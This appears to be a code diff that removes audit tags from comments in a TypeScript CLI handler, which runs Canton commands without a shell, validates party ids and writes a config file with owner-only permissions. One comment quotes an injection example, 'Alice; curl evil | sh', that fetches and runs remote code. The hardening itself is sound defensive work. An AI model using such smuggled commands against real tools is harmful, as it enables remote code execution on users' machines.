@@ -73,7 +73,7 @@ function tryExec(cmd: string): string | null {
 }
 
 /**
- * [M-12] Run a command with an explicit argv array and NO shell, returning
+ * Run a command with an explicit argv array and NO shell, returning
  * trimmed stdout or null on failure. Use this whenever any argument is
  * derived from user input (e.g. party ids) — `execSync` with an
  * interpolated string would let `--parties 'Alice; curl evil | sh'`
@@ -94,7 +94,7 @@ function tryExecArgs(file: string, args: readonly string[]): string | null {
 }
 
 /**
- * [M-12] Validate a Canton party id before it is ever passed to a command.
+ * Validate a Canton party id before it is ever passed to a command.
  * Party ids are `<name>::<fingerprint>` (or a bare name pre-allocation);
  * the allowed character set is conservative and excludes every shell
  * metacharacter. Throws on anything suspicious.
@@ -339,7 +339,7 @@ export async function handler(argv: ArgumentsCamelCase<SandboxArgs>): Promise<vo
   const failedParties: string[] = [];
 
   for (const party of parties) {
-    // [M-12] Validate then pass as an argv array (no shell interpolation).
+    // Validate then pass as an argv array (no shell interpolation).
     assertSafePartyId(party);
     const result = tryExecArgs('canton', [
       'ledger', 'allocate-parties',
@@ -392,7 +392,7 @@ export async function handler(argv: ArgumentsCamelCase<SandboxArgs>): Promise<vo
   ].join('\n');
 
   try {
-    // [M-11] Write owner-read/write only (0600). The config file may hold a
+    // Write owner-read/write only (0600). The config file may hold a
     // `token:` and lands in $HOME; the default umask would otherwise make it
     // world-readable (0644).
     writeFileSync(configPath, configContent, { encoding: 'utf-8', mode: 0o600 });
